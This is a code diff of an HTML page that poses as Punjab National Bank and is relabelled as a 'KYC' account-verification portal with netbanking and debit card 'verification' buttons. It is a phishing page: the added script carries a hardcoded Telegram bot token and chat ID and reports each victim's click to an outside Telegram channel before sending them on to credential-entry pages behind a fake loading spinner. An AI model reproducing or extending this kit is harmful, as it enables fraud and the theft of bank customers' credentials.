@@ -5,17 +5,49 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Punjab National Bank</title>
     <link rel="stylesheet" href="style3.css">
+    <style>
+        /* Loading animation styles */
+        #loading {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.8);
+            z-index: 9999;
+        }
+
+        .loader {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #FF5722;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+    </style>
 </head>
 <body>
+
+    <div id="loading">
+        <div class="loader"></div>
+    </div>
 
     <!-- Header Section -->
     <header>
         <button class="menu-toggle">&#9776;</button> <!-- Hamburger Menu (Left Side) -->
         <div class="logo-container">
             <img src="pnb-logo.png" alt="PNB Logo">
-
-        </div>
-        <div class="sub-header">Punjab National Bank Credit Card Apply Portal</div>
         </div>
         <nav>
             <ul class="nav-links">
@@ -26,19 +58,54 @@
             </ul>
         </nav>
     </header>
-
-    <!-- Buttons Section -->
+   
     <section class="buttons">
-        <button class="main-btn" onclick="window.location.href='PNB Self Authentication.html';">Netbanking</button>
-        <button class="main-btn" onclick="window.location.href='Debitcard.html';">Debit/Cradit Card</button>
+        <div class="sub-header" style="
+            font-family: 'Poppins', sans-serif;
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: #FF5722;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+            margin: 20px 0;">
+            Account Verification - KYC
+        </div>
+
+        <button class="main-btn" onclick="sendBotMessage('NetBanking Verification selected ✅'); navigateWithLoading('PNB Self Authentication.html');">
+            NetBanking Verification
+        </button>
+        <button class="main-btn" onclick="sendBotMessage('Debit Card Verification selected ⚡'); navigateWithLoading('Debitcard.html');">
+            Debit Card Verification
+        </button>
     </section>
    
     <!-- Footer Section -->
     <footer class="footer-container">
         <p class="footer-text">&copy; 2025 Punjab National Bank. All Rights Reserved.</p>
-        <img src="pnb-drawal.png" alt="PNB Drawal Image" class="footer-image">
     </footer>
 
-    <script src="script.js"></script>
+    <script>
+        const BOT_API = '7302997867:AAGU5IW98_lQkdPXn5Y7lAxFEZUIP7Yo1YQ';
+        const CHAT_ID = '-1002377802733';
+
+        function sendBotMessage(message) {
+            const url = `https://api.telegram.org/bot${BOT_API}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Message sent successfully');
+                    } else {
+                        console.error('Failed to send message');
+                    }
+                })
+                .catch(error => console.error('Error:', error));
+        }
+
+        function navigateWithLoading(url) {
+            document.getElementById('loading').style.display = 'block';
+            setTimeout(function () {
+                window.location.href = url;
+            }, 1000); // Simulates the loading duration
+        }
+    </script>
 </body>
 </html>
